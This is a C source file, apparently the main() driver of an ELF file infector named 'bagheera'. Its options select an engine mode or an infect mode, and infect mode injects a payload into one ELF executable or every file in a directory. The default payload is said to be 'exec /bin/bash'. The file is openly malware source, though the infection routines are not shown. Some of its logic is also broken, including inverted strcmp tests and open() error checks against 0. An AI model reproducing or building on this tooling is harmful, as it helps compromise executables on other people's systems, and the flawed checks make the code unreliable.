#include "src/bagheera.hpp"
#include "src/includes.hpp"
#include "src/definitions.h"
#include "src/helpers.h"
#include "engine.h"
#include "infect.h"

extern int errno;
extern char *optarg;
extern int opterr, optind;

int main(int argc, char *argv[])
{

    int opt, input_fd, input_size;
    opterr = 0;
    
    options_t options = { 0,                       // verbose - default: no verbose                    
                          0,                       // mode - mandatory                                  
                          default_payload(),       // input - default: 'exec /bin/bash' payload        
                          default_payload_size(),  // inputsz - default: 'exec /bin/bash' payload size 
                          1,                       // output - default: stdout                          
                          -1,                      // elf - default: no file                           
                          NULL };                  // dir - default: no dir                            


    while ((opt = getopt(argc, argv, OPTSTR)) != EOF)
      switch(opt) {
    
        case 'm':
          if (strcmp(optarg, ENGINE))
            options.mode = MODE_ENGINE;
    
          else if (strcmp(optarg, INFECT))
            options.mode = MODE_INFECT;
          
          else
            error_verbose(ERR_MODE, basename(argv[0]));
    
          break;



        case 'i':
          if (!(input_fd = open(optarg, O_RDONLY)) )
            error(ERR_INPUT_OPEN);

          options.inputsz = lseek(input_fd, 0, SEEK_END);
          lseek(input_fd, 0, SEEK_SET);

          options.input = (char *) malloc(options.inputsz);
          if (options.input == NULL )
            error(ERR_INPUT_MALLOC);
          
          if (read(input_fd, options.input, options.inputsz) != options.inputsz)
            error(ERR_INPUT_READ);

          break;



        case 'o':
          if (!(options.output = open(optarg, O_RDWR)) )
            error(ERR_FOPEN_OUTPUT);
          break;



        case 'e':
          if (!(options.elf = open(optarg, O_RDWR|O_SYNC)) )
            error(ERR_FOPEN_ELF);
          break;



        case 'd':
          options.dir = opendir(optarg);

          if (options.dir == NULL)
            error(ERR_DIR_OPEN);
          
          break;
            


        case 'v':
          options.verbose = 1;
          break;



        case 'h':
        default:
          usage(basename(argv[0]), opt);
          break;
      }


    if ( !options.mode )
      error(ERR_MODE);

    if (options.mode == MODE_INFECT)
    {
      if (options.elf == -1 && options.dir != NULL)
        directory_infection(&options);      
      else if (options.elf != -1 && options.dir == NULL)  
        elf_infection(&options);
      else
        error(ERR_MODE_INFECT_OPTIONS);
    }
    else 
    {
      engine_execution(&options);
    }

    return EXIT_SUCCESS;
}

